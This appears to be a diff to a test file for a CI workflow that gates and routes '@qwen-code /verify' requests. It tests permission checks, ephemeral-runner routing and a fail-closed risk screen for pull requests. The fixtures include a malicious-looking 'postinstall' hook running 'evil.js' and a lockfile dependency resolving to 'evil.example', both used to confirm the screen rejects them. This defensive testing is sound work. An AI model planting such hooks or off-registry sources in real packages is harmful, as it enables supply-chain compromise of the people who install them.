@@ -4,7 +4,7 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { spawnSync } from 'node:child_process';
+import { spawn, spawnSync } from 'node:child_process';
 import {
   mkdirSync,
   mkdtempSync,
@@ -538,10 +538,15 @@ describe('qwen-triage tmux workflow', () => {
     // ...name the trigger and what it settles, not just the trigger...
     expect(section).toContain('@qwen-code /verify');
     expect(section).toContain('the specific claim it would settle');
-    // ...and keep the author-permission carve-out, or the bot sends
-    // maintainers into a guaranteed denial on external contributors' PRs.
-    expect(section).toContain('AUTHOR');
-    expect(section).toContain('sandboxed lanes are unavailable');
+    // ...and keep the author-permission case, which since the sponsored
+    // lane shipped must offer the sponsored /verify (ephemeral runner +
+    // risk screen) rather than declaring the lanes unavailable — while
+    // still warning that an external author's report is adversarial input.
+    expect(section).toContain('The author lacks write access');
+    expect(section).toContain('sponsored run');
+    expect(section).toContain('ephemeral GitHub-hosted runner');
+    expect(section).toContain('same skepticism as the fork');
+    expect(section).not.toContain('sandboxed lanes are unavailable');
 
     // The assembly order is the other half: a section nothing assembles is
     // as dead as one nobody reads.
@@ -750,7 +755,12 @@ describe('qwen-triage verify workflow', () => {
   // drops the /verify patterns from the case statement falls back to
   // commenter-only gating, which this catches via the author-without-write
   // arm; dropping the commenter check is caught by the drive-by arm.
-  it('gates /verify on both the author and the commenter, fail-closed', () => {
+  it('routes /verify by author permission and gates on the commenter', () => {
+    // The commenter GATES (they spend the runner slot and model budget);
+    // the author's permission ROUTES: write -> the persistent ECS pool,
+    // anything else -> a sponsored run on an ephemeral hosted VM with the
+    // head OID snapped at sponsorship time. Every lookup failure denies:
+    // a request that cannot be classified must not pick a trust level.
     const permStep = step('Check principal write permission');
     const body = permStep.match(/run: \|-\n([\s\S]*)$/)?.[1];
     expect(body).toBeTruthy();
@@ -761,6 +771,12 @@ describe('qwen-triage verify workflow', () => {
       join(dir, 'gh'),
       [
         '#!/usr/bin/env bash',
+        'if [ "$1" = pr ]; then',
+        '  # gh pr view <n> ... --json headRefOid: the sponsorship snapshot.',
+        '  [ "$3" = "99" ] && exit 1',
+        '  echo deadbeefcafe',
+        '  exit 0',
+        'fi',
         'u="${2##*collaborators/}"; u="${u%%/*}"',
         'case "$u" in',
         '  alice) echo write ;;',
@@ -773,7 +789,7 @@ describe('qwen-triage verify workflow', () => {
     );
 
     let n = 0;
-    const gate = (commentBody, author, commenter) => {
+    const gate = (commentBody, author, commenter, issueNumber = '1') => {
       const out = join(dir, `out-${n++}`);
       writeFileSync(out, '');
       spawnSync('bash', ['-c', script], {
@@ -789,57 +805,63 @@ describe('qwen-triage verify workflow', () => {
           ISSUE_AUTHOR: author,
           COMMENT_USER: commenter,
           PR_NUMBER: '1',
+          ISSUE_NUMBER: issueNumber,
           TMUX_PR: '',
         },
         encoding: 'utf8',
       });
       const lines = readFileSync(out, 'utf8').trim().split('\n');
+      const val = (k) =>
+        lines
+          .filter((l) => l.startsWith(`${k}=`))
+          .pop()
+          ?.slice(k.length + 1);
       return {
-        run: lines.filter((l) => l.startsWith('should_run=')).pop(),
-        explain: lines.some((l) => l === 'explain_deny=true'),
+        run: val('should_run'),
+        runner: val('verify_runner'),
+        oid: val('verify_head_oid'),
       };
     };
 
     try {
-      // Drive-by commenter without write cannot spend the sandbox budget.
-      const driveBy = gate('@qwen-code /verify', 'alice', 'mallory');
-      expect(driveBy.run).toBe('should_run=false');
-      expect(driveBy.explain).toBe(false);
-      // Both principals hold write -> allowed.
-      expect(gate('@qwen-code /verify', 'alice', 'bob').run).toBe(
-        'should_run=true',
+      // Drive-by commenter without write cannot spend the sandbox budget,
+      // whoever the author is.
+      expect(gate('@qwen-code /verify', 'alice', 'mallory').run).toBe('false');
+      // Write-access author -> the persistent pool, no snapshot needed.
+      const trusted = gate('@qwen-code /verify', 'alice', 'bob');
+      expect(trusted.run).toBe('true');
+      expect(trusted.runner).toBe('ecs');
+      expect(trusted.oid).toBeUndefined();
+      // EXTERNAL author + trusted commenter -> allowed, routed to the
+      // ephemeral hosted lane, head OID snapped now. This is the case that
+      // used to deny — the whole point of the sponsored lane.
+      const sponsored = gate('@qwen-code /verify', 'mallory', 'bob');
+      expect(sponsored.run).toBe('true');
+      expect(sponsored.runner).toBe('hosted');
+      expect(sponsored.oid).toBe('deadbeefcafe');
+      // Author commenting on their own PR still routes ecs.
+      expect(gate('@qwen-code /verify', 'alice', 'alice').runner).toBe('ecs');
+      // Author permission unreadable -> deny; routing must not guess.
+      expect(gate('@qwen-code /verify', 'charlie', 'bob').run).toBe('false');
+      // Deleted author (empty login) -> deny, same reason.
+      expect(gate('@qwen-code /verify', '', 'bob').run).toBe('false');
+      // Head OID snapshot failure on the hosted path -> deny: a sponsored
+      // run without a pinned head would execute whatever gets pushed next.
+      expect(gate('@qwen-code /verify', 'mallory', 'bob', '99').run).toBe(
+        'false',
       );
-      // A trusted commenter on an untrusted author's PR is denied (the
-      // sandbox executes the AUTHOR's code) but gets the explanation flag.
-      const untrustedAuthor = gate('@qwen-code /verify', 'mallory', 'bob');
-      expect(untrustedAuthor.run).toBe('should_run=false');
-      expect(untrustedAuthor.explain).toBe(true);
-      // Author commenting on their own PR is checked exactly once.
-      expect(gate('@qwen-code /verify', 'alice', 'alice').run).toBe(
-        'should_run=true',
-      );
-      // A permission-API failure fails closed and stays silent.
-      const apiError = gate('@qwen-code /verify', 'charlie', 'bob');
-      expect(apiError.run).toBe('should_run=false');
-      expect(apiError.explain).toBe(false);
-      // /tmux keeps its existing author-only gate; /triage keeps the
-      // commenter gate.
-      expect(gate('@qwen-code /tmux', 'alice', 'mallory').run).toBe(
-        'should_run=true',
-      );
-      expect(gate('@qwen-code /triage', 'alice', 'mallory').run).toBe(
-        'should_run=false',
-      );
+      // /tmux keeps its author-only gate; /triage keeps the commenter gate.
+      expect(gate('@qwen-code /tmux', 'alice', 'mallory').run).toBe('true');
+      expect(gate('@qwen-code /tmux', 'mallory', 'bob').run).toBe('false');
+      expect(gate('@qwen-code /triage', 'mallory', 'bob').run).toBe('true');
+      // Neither non-verify path emits routing outputs.
+      expect(
+        gate('@qwen-code /triage', 'mallory', 'bob').runner,
+      ).toBeUndefined();
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
   });
-
-  // The pin step's sweep runs BEFORE npm ci/build execute the PR's
-  // lifecycle scripts, so a postinstall can re-plant a fake
-  // tmp/*-verify-* dir whose zeroed timestamp sorts ahead of the agent's
-  // real one. The agent step must therefore sweep again after the last
-  // PR-controlled process and before qwen launches.
   it('sweeps planted verify artifacts after the last PR-controlled process', () => {
     const runStep = step('Run verification agent');
     const sweep =
@@ -890,11 +912,222 @@ describe('qwen-triage verify hardening', () => {
   // job's PR guard skips it and publish-verify skips with it — accepted
   // looking, permanently silent. Every step that answers a /verify request
   // carries the same guard.
+  // The routing that makes a sponsored run safe is positional: the lane
+  // decision must reach runs-on (an ephemeral machine), and the kill
+  // switch must keep blocking ONLY the pool it disables.
+  it('routes the sponsored lane to an ephemeral runner', () => {
+    const verifyJob = job('verify');
+    // runs-on switches on the authorize routing output; hosted goes to
+    // GitHub's ephemeral pool, everything else stays on ECS.
+    expect(verifyJob).toMatch(
+      /runs-on:.*needs\.authorize\.outputs\.verify_runner == 'hosted'[\s\S]{0,80}ubuntu-latest/,
+    );
+    expect(verifyJob).toContain('ecs-qwen');
+    // The ECS kill switch must not strand the hosted lane: an ephemeral
+    // GitHub runner does not depend on the pool being enabled.
+    expect(verifyJob).toMatch(
+      /MAINTAINER_ECS_RUNNER_DISABLED != 'true' \|\|\s+needs\.authorize\.outputs\.verify_runner == 'hosted'/,
+    );
+    // And the authorize-side notice for the disabled pool must exempt the
+    // hosted lane for the same reason.
+    const notice = stepIn('authorize', 'Report disabled verify lane');
+    expect(notice).toContain("steps.perm.outputs.verify_runner != 'hosted'");
+  });
+
+  // The sponsored lane's pre-execution risk screen, driven for real: the
+  // actual resolve-step text runs against a stubbed gh and a live local
+  // HTTP server standing in for the model endpoint, so the heredoc's
+  // fetch/parse/fail-closed logic is what executes — not a re-statement
+  // of it. Every arm asserts on the step's real GITHUB_OUTPUT.
+  it('screens sponsored runs mechanically and via the model, fail-closed', async () => {
+    const resolveStep = stepIn('verify', 'Resolve PR and snapshot metadata');
+    const script = resolveStep
+      .match(/run: \|-\n([\s\S]*)$/)?.[1]
+      .replace(/^ {10}/gm, '');
+    expect(script).toBeTruthy();
+
+    // The model endpoint must be a SEPARATE process: the scenarios run the
+    // step via spawnSync, which blocks this process's event loop — an
+    // in-process server could never answer, and the screen's fetch would
+    // sit on its 120 s abort timer instead of testing anything.
+    const dir = mkdtempSync(join(tmpdir(), 'verify-screen-'));
+    const replyFile = join(dir, 'model-reply');
+    const hitsFile = join(dir, 'model-hits');
+    const portFile = join(dir, 'model-port');
+    writeFileSync(portFile, '');
+    writeFileSync(replyFile, '{"risk":"clear"}');
+    writeFileSync(hitsFile, '');
+    const serverProc = spawn(
+      process.execPath,
+      [
+        '-e',
+        [
+          "const http=require('http'),fs=require('fs');",
+          'const s=http.createServer((q,r)=>{',
+          "fs.appendFileSync(process.env.HITS,'x');",
+          "r.setHeader('content-type','application/json');",
+          "r.end(JSON.stringify({choices:[{message:{content:fs.readFileSync(process.env.REPLY,'utf8')}}]}));",
+          '});',
+          "s.listen(0,'127.0.0.1',()=>fs.writeFileSync(process.env.PORTF,String(s.address().port)));",
+        ].join(''),
+      ],
+      {
+        env: {
+          ...process.env,
+          HITS: hitsFile,
+          REPLY: replyFile,
+          PORTF: portFile,
+        },
+        stdio: 'ignore',
+      },
+    );
+    for (let i = 0; i < 100 && !readFileSync(portFile, 'utf8').trim(); i++) {
+      await new Promise((r) => setTimeout(r, 50));
+    }
+    const port = readFileSync(portFile, 'utf8').trim();
+    expect(port).not.toBe('');
+    const modelHits = () => readFileSync(hitsFile, 'utf8').length;
+    const setReply = (v) => writeFileSync(replyFile, v);
+    writeFileSync(
+      join(dir, 'gh'),
+      [
+        '#!/usr/bin/env bash',
+        'case "$*" in',
+        '  *"--json state,isDraft,mergeable"*)',
+
+        '    echo \'{"state":"OPEN","isDraft":false,"mergeable":"MERGEABLE"}\' ;;',
+        '  *pulls/*/files*) echo packages/core/src/x.ts ;;',
+        '  *"pr diff"*) cat "$GH_STUB_DIFF" ;;',
+        '  *"--json number,title"*)',
+        '    printf \'{"headRefOid":"%s","author":{"login":"ext"}}\' "$GH_STUB_OID" ;;',
+        '  *collaborators/*) echo none ;;',
+        '  *"api user"*) echo bot ;;',
+        '  *comments*) echo "[]" ;;',
+        '  *) exit 0 ;;',
+        'esac',
+      ].join('\n'),
+      { mode: 0o755 },
+    );
+
+    let n = 0;
+    const run = ({ lane, diff, prOid, sponsoredOid, baseUrl }) => {
+      const temp = join(dir, `t${n}`);
+      mkdirSync(temp, { recursive: true });
+      const out = join(dir, `out-${n}`);
+      const diffFile = join(dir, `diff-${n}`);
+      n += 1;
+      writeFileSync(out, '');
+      writeFileSync(diffFile, diff);
+      const res = spawnSync('bash', ['-c', script], {
+        cwd: temp,
+        encoding: 'utf8',
+        env: {
+          ...process.env,
+          PATH: `${dir}:${process.env.PATH}`,
+          GH_TOKEN: 'x',
+          GH_STUB_DIFF: diffFile,
+          GH_STUB_OID: prOid ?? 'oid-1',
+          GITHUB_REPOSITORY: 'QwenLM/qwen-code',
+          GITHUB_STEP_SUMMARY: '/dev/null',
+          GITHUB_OUTPUT: out,
+          RUNNER_TEMP: temp,
+          PR_NUMBER: '7',
+          RUN_URL: 'u',
+          VERIFY_LANE: lane,
+          SPONSORED_OID: sponsoredOid ?? 'oid-1',
+          REVIEW_OPENAI_API_KEY: 'k',
+          REVIEW_OPENAI_BASE_URL: baseUrl ?? `http://127.0.0.1:${port}/v1`,
+          OPENAI_MODEL: 'screen-model',
+        },
+      });
+      expect(res.status).toBe(0);
+      const lines = readFileSync(out, 'utf8').trim().split('\n');
+      const val = (k) =>
+        lines
+          .filter((l) => l.startsWith(`${k}=`))
+          .pop()
+          ?.slice(k.length + 1);
+      return { decision: val('decision'), reason: val('skip_reason') ?? '' };
+    };
+
+    const CLEAN = '+++ b/packages/core/src/x.ts\n+const x = 1;\n';
+    try {
+      // Mechanical: an added npm lifecycle script refuses WITHOUT spending
+      // a model call — a mechanical flag cannot be un-refused by a second
+      // opinion, so paying for one would be pure waste.
+      const before = modelHits();
+      const lifecycle = run({
+        lane: 'hosted',
+        diff: '+++ b/package.json\n+    "postinstall": "node evil.js",\n',
+      });
+      expect(lifecycle.decision).toBe('skip');
+      expect(lifecycle.reason).toContain('risk screen');
+      expect(lifecycle.reason).toContain('npm lifecycle');
+      expect(modelHits()).toBe(before);
+
+      // Mechanical: a dependency resolving off-registry.
+      const offReg = run({
+        lane: 'hosted',
+        diff: '+++ b/package-lock.json\n+      "resolved": "https://evil.example/x.tgz",\n',
+      });
+      expect(offReg.decision).toBe('skip');
+      expect(offReg.reason).toContain('registry.npmjs.org');
+
+      // Clean diff + model clear -> the run proceeds.
+      setReply('{"risk":"clear"}');
+      const clear = run({ lane: 'hosted', diff: CLEAN });
+      expect(clear.decision).toBe('run');
+      expect(modelHits()).toBeGreaterThan(before);
+
+      // Model flagged -> refused.
+      setReply('{"risk":"flagged"}');
+      expect(run({ lane: 'hosted', diff: CLEAN }).decision).toBe('skip');
+
+      // Unparseable model reply -> refused (fail closed), never treated
+      // as clear.
+      setReply('looks fine to me!');
+      const garbage = run({ lane: 'hosted', diff: CLEAN });
+      expect(garbage.decision).toBe('skip');
+      expect(garbage.reason).toContain('unparseable');
+
+      // Unreachable model endpoint -> refused (fail closed).
+      setReply('{"risk":"clear"}');
+      const dead = run({
+        lane: 'hosted',
+        diff: CLEAN,
+        baseUrl: 'http://127.0.0.1:1/v1',
+      });
+      expect(dead.decision).toBe('skip');
+
+      // Sponsorship pin: the head moved after the sponsoring comment.
+      const moved = run({
+        lane: 'hosted',
+        diff: CLEAN,
+        prOid: 'oid-2',
+        sponsoredOid: 'oid-1',
+      });
+      expect(moved.decision).toBe('skip');
+      expect(moved.reason).toContain('re-comment');
+
+      // ECS lane is untouched by the screen: the same external author is
+      // refused by the execution-time permission re-check instead, and the
+      // refusal points at the sponsored alternative.
+      const ecs = run({ lane: 'ecs', diff: CLEAN });
+      expect(ecs.decision).toBe('skip');
+      expect(ecs.reason).toContain('sponsor');
+    } finally {
+      serverProc.kill();
+      rmSync(dir, { recursive: true, force: true });
+    }
+  }, 60000);
+
   it('restricts every verify notice to pull requests', () => {
+    // 'Explain denied verify request' is gone by design: an external author
+    // no longer denies the run — it routes it to the hosted lane instead.
+    expect(stepIn('authorize', 'Explain denied verify request')).toBe('');
     for (const name of [
       'Acknowledge verify request',
       'Report disabled verify lane',
-      'Explain denied verify request',
     ]) {
       const raw = stepIn('authorize', name);
       expect(raw, `${name} is missing from the authorize job`).not.toBe('');
